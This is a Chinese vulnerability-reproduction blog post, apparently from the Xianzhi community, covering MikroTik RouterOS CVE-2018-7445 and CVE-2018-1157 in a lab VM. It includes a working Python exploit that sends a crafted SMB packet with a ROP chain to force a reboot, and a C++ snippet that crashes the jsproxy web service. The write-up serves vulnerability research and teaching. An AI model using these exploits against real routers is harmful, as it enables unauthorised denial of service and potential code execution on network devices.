# mikrotik 漏洞复现（一）-先知社区

> **来源**: https://xz.aliyun.com/news/18310  
> **文章ID**: 18310

---

## 先配置好mikrotik RouterOS 环境：

官网下载好对应版本的镜像文件

![](images/20250626110148-e6f60270-5239-1.png)

新建虚拟机，把配置全部安装好

![](images/20250626110149-e7348806-5239-1.png)

Mikrotik终端的命令受限制，很多指令不可使用，先给器配置好ip：

![](images/20250626110149-e74d8868-5239-1.png)

![](images/20250626110149-e771e908-5239-1.png)

使用工具：mikrotik-tools，运行脚本开启telnet

现在可以执行一些linux命令：

![](images/20250626110150-e7a6954a-5239-1.png)

### CVE-2018-7445

![](images/20250626110150-e7cc2df0-5239-1.png)

这里找到对该漏洞更详细的说明：

![](images/20250626110150-e7fd3128-5239-1.png)

漏洞描述：在处理 NetBIOS 会话请求消息时，在 MikroTik RouterOS **SMB 服务**中发现缓冲区溢出。有权访问该服务的远程攻击者可以利用此漏洞并在系统上执行代码。溢出发生在身份验证之前，因此未经身份验证的远程攻击者可能会利用它。运行 6.41.3/6.42rc27 之前的 RouterOS 的所有架构和所有设备都容易受到攻击。

没有开启smb服务：

![](images/20250626110150-e81f8978-5239-1.png)

MikroTik虚拟机中

![](images/20250626110151-e8320990-5239-1.png)

Ubuntu中查看进程：服务成功启动

![](images/20250626110151-e84f0b8a-5239-1.png)

Web服务可以成功访问：

![](images/20250626110151-e8728062-5239-1.png)

将有漏洞的二进制文件smb拿出，ida分析：

ELF 32-bit，几乎没有保护开启

![](images/20250626110151-e89af2a2-5239-1.png)

Ida定位到产生漏洞的代码：0x08054607

这里对a1进行循环的赋值，且赋值的范围是v2

![](images/20250626110152-e8c10438-5239-1.png)

向上引用这个函数：sub\_8054607：

![](images/20250626110152-e8d88946-5239-1.png)

后面只需要看程序**如何才能运行到这里**，以及传入的**参数格式**是什么样的即可，并且绕过前面的这三个检查，才能调用到关键函数：

![](images/20250626110152-e8f80870-5239-1.png)

后面搜索发现，这个是一个处理smb协议的程序，下载smbclient工具自动发包。

下载./gdbserver.i686传进去到虚拟机，开始远程调试smb

附加调试程序：./gdbserver.i686 localhost:1234 --attach 302

gdb

set architecture i386

target remote 192.168.72.140:1234

![](images/20250626110152-e9474c28-5239-1.png)

在sub\_806B11C函数下断点：

发包：smbclient -L //192.168.72.140

gdb成功触发断点：

![](images/20250626110153-e99821f4-5239-1.png)

但是自动构造的包，似乎无法绕过第一个检查：

![](images/20250626110154-ea11784a-5239-1.png)

![](images/20250626110154-ea492164-5239-1.png)

使用wireshark抓包：

![](images/20250626110155-eaa0d268-5239-1.png)

改一下包，使用python发送：

修改81绕过第一个条件

![](images/20250626110155-eae2024c-5239-1.png)

Python发包后可以直接绕过第一个条件

![](images/20250626110156-eb24b8c8-5239-1.png)

刚好第二个条件同样满足：

![](images/20250626110156-eb5cab66-5239-1.png)

直接到调用sub\_8054607函数的位置，看一下调用这个函数时的参数：

前面看到存在溢出的函数：sub\_8054607，这里v2我们需要给一个大一点的值，便于或许的栈溢出：

![](images/20250626110156-eb7731ca-5239-1.png)

函数sub\_8054607，从发送的数据报这个位置取出长度：

![](images/20250626110156-eb9f51c8-5239-1.png)

在python中修改之后重新发包：

这里看到长度足够，而且后续报Segmentation fault.段错误（已经造成拒绝服务），说明可能已经溢出到了返回值的位置，后续只要看赋值为啥即可，再构造ROP链：

![](images/20250626110157-ebe1995c-5239-1.png)

调试寻找溢出长度：

Python脚本定位溢出长度，这里我们缩短对应的报文长度，将不必要的位置去掉

import socket

# SMB 二进制数据包（以十六进制写入）

smb\_packet = bytes.fromhex("""

81 00 00 ec fe 53 4d 42 40 00 00 00 00 00 00 00

00 00 1f 00 00 00 00 00 00 00 00 00 00 00 00 00

00 00 00 00 00 00 ff ff 00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

00 00 00 00 24 00 05 00 01 00 00 00 7f 00 00 00

1c db 24 07 40 f5 54 4f 85 65 67 8c ae e1 7f f4

70 00 00 00 04 00 00 00 """)

smb\_packet += b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"

# 配置目标 IP 和端口

target\_ip = "192.168.72.140"

target\_port = 445

# 创建 TCP socket 并连接目标

with socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) as s:

    s.settimeout(5)

    print(f"[+] Connecting to {target\_ip}:{target\_port}...")

    s.connect((target\_ip, target\_port))

    print("[+] Sending SMB packet...")

    s.sendall(smb\_packet)

    try:

        response = s.recv(4096)

        print(f"[+] Received {len(response)} bytes in response:")

        print(response.hex())

    except socket.timeout:

        print("[-] No response received (timeout)")

可以看到已经

![](images/20250626110157-ec13f6d8-5239-1.png)

调试一下，看sub\_8054607函数是从报文的哪里开始进行赋值的：

在这里下缎断点

![](images/20250626110157-ec2eda46-5239-1.png)

从0x80748c7位置开始赋值，即上面代表长度的字节后面就开始赋值数据了：

![](images/20250626110158-ec56f046-5239-1.png)

修改报文如下：

# SMB 二进制数据包（以十六进制写入）

smb\_packet = bytes.fromhex("""

81 00 00 ec fe 53 4d 42 40 00 00 00 00 00 00 00

00 00 1f 00 00 00 00 00 00 00 00 00 00 00 00 00

00 00 00 00 00 00 ff """)

smb\_packet += b"Aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"

成功覆盖我指定的字符串

![](images/20250626110158-ec8d2dda-5239-1.png)

最后报错的位置的字符串如下：

![](images/20250626110158-ecc2549c-5239-1.png)

最后可以确定溢出长度为64（因为前面赋值的时候包含了一个0xff）。

从这里开始构造ROP链：

由于smb程序中有没有system函数之内的可以使用，所以只能用so文件中的函数，该系统开启了aslr，每次启动程序libc的基址都会发生变化，如果想走libc需要电写了基址。

![](images/20250626110159-ed173552-5239-1.png)

如果不想走前面的libc（利用流程太多），我们关注到vmmap显示的最后一段:

0xffffe000 0xfffff000 r-xp 1000 0 [vdso]

它的作用是在用户态加速系统调用的执行。

将其dump下来：

dump memory /home/bkbqwq/Desktop/iot/mikrotik/smb 0xffffe000 0xfffff000

搜索可用的gadget，因为这个程序的架构是0x86，所以要想调用系统调用，就可用搜索int 0x80：

**0xffffe422: int 0x80; pop ebp; pop edx; pop ecx; ret;**

![](images/20250626110159-ed471ce8-5239-1.png)

在找一下给寄存器传参的gadget：

![](images/20250626110200-ed8915e6-5239-1.png)

0x0804f7da : pop eax ; pop ebx ; pop ebp ; ret

0x08054017 : pop edx ; pop ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

调试查看栈上布置的ROP：

![](images/20250626110200-edd77134-5239-1.png)

最后成功执行到系统调用SYS\_execve

![](images/20250626110200-ee129550-5239-1.png)

但是执行完后似乎没有成功起shell。换一个系统调用：

![](images/20250626110201-ee2b1f4c-5239-1.png)

参数说明如下：

![](images/20250626110201-ee52cc9c-5239-1.png)

![](images/20250626110201-ee7dc19a-5239-1.png)

**执行后系统成功重启，说明调用成功：**

![](images/20250626110201-eeb0adda-5239-1.png)

**EXP：**

import socket

from pwn import \*

# SMB 二进制数据包（以十六进制写入）

smb\_packet = bytes.fromhex("""

81 00 00 ec fe 53 4d 42  40 00 00 00 00 00 00 00

00 00 1f 00 00 00 00 00  00 00 00 00 00 00 00 00

00 00 00 00 00 00 ff ff""")

smb\_packet += b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa"

# 构造ROP

int\_0x80\_popebp\_popedx\_popecx\_ret= 0xffffe422

popedx\_popecx\_popebx\_popesi\_popedi\_popebp\_ret = 0x08054017

popeax\_popebx\_popebp\_ret = 0x0804f7da

str\_sh\_addr = 0xffffe436

payload = p32(popedx\_popecx\_popebx\_popesi\_popedi\_popebp\_ret)

payload+= p32(0x1234567) + p32(672274793) + p32(0xfee1dead) + p32(0) + p32(0) + p32(0)

payload+= p32(popeax\_popebx\_popebp\_ret)

payload+= p32(0x58) + p32(0xfee1dead) + p32(0)

payload+= p32(int\_0x80\_popebp\_popedx\_popecx\_ret)

payload+=b"a"\*0x100

smb\_packet+=payload

# 配置目标 IP 和端口

target\_ip = "192.168.72.140"

target\_port = 445

# 创建 TCP socket 并连接目标

with socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) as s:

    s.settimeout(5)

    print(f"[+] Connecting to {target\_ip}:{target\_port}...")

    s.connect((target\_ip, target\_port))

    print("[+] Sending SMB packet...")

    s.sendall(smb\_packet)

    try:

        response = s.recv(4096)

        print(f"[+] Received {len(response)} bytes in response:")

        print(response.hex())

    except socket.timeout:

        print("[-] No response received (timeout)")

### **CVE-2018-1157**

再看一下程序运行的服务：可见还有一个www的程序运行在80端口、用提供web服务

![](images/20250626110202-eed1b3a4-5239-1.png)

使用bp抓包分析一下：

可以看见，发送了一个post请求，请求的路径为/jsproxy，其中传输的数据应该是被加密过了：

![](images/20250626110202-ef0c9dfa-5239-1.png)

找到jsproxy处理程序：

![](images/20250626110202-ef3c3c88-5239-1.png)

但是他似乎并不是一个可以直接执行的程序，shared object表示其为一个共享库类似.so文件

![](images/20250626110203-ef970708-5239-1.png)

上面看到启动服务的程序只有smb和www，所以后续在www程序中找到了其加载的jsproxy.p文件：

![](images/20250626110203-efd90a5e-5239-1.png)

![](images/20250626110204-f019e5c6-5239-1.png)

![](images/20250626110204-f03396cc-5239-1.png)

漏洞利用为经过验证，向 /jsproxy/upload 发送构建的 POST 请求

定位到漏洞位置：

需要发送正确的加密数据包才能执行到这里

![](images/20250626110204-f051bc7e-5239-1.png)

因为发送的post请求被加密了，前面在这里对发送过来的post请求有进行解密：

![](images/20250626110204-f069d306-5239-1.png)

调试查看：

![](images/20250626110205-f099e080-5239-1.png)

![](images/20250626110205-f0d43dac-5239-1.png)

post请求的数据需要根据指定的加密方式进行加密，否则服务器将无法处理：

![](images/20250626110205-f0ffe97a-5239-1.png)

分析漏洞漏洞成因：sub\_774BBE9F函数中从post请求中拿数据，放到s1中，出函数之后，检查了是否取出数据：

![](images/20250626110206-f11bf5a2-5239-1.png)

如果sub\_774BBE9F函数一直能解析出数据，且Headers::parseHeaderLine能一直解析出正确的头部，那么这个循环将一直执行下去。

![](images/20250626110206-f1359158-5239-1.png)

在循环中的if判断位置断点，进行调试：

读之前的数据：

![](images/20250626110206-f168c512-5239-1.png)

读之后：

![](images/20250626110207-f1be7de8-5239-1.png)

后续一直往上面相同的位置读入数据，但是这里由于读入数据有长度限制，所以无法进行栈溢出，但是程序会一直处在这个循环里面。

部分Exp：直接利用RouterOS官方提供的 c++的winboxapi库

if (!jsSession.negotiateEncryption(username, password)) // 加密

    {

        std::cerr << "Encryption negotiation failed." << std::endl;

        return EXIT\_FAILURE;

    }

    std::string filename;

    for (int i = 0; i < 0x200; i++)

    {

        filename.push\_back('A'); // 填充超过0x100个字符

    }

    if (jsSession.uploadFile(filename, "lol."))

    {

        std::cout << "success!" << std::endl;

    }

最后服务成功下线：![](images/20250626110207-f20c6190-5239-1.png)

![](images/20250626110207-f2389bde-5239-1.png)

多运行几次exp，即可使系统重启，因为一个www被攻击掉后，该路由器似乎会再启动一个www服务：

![](images/20250626110208-f28093f8-5239-1.png)

前面一位虚拟机的内存给的比较大，这里我们将MikroTik RouterOS虚拟机的内存给小一点，使其资源更容易耗尽：

![](images/20250626110208-f2b6579a-5239-1.png)

再运行脚本，资源耗尽，虚拟机直接关机：

![](images/20250626110209-f32c5bac-5239-1.png)

![](images/20250626110209-f374098c-5239-1.png)
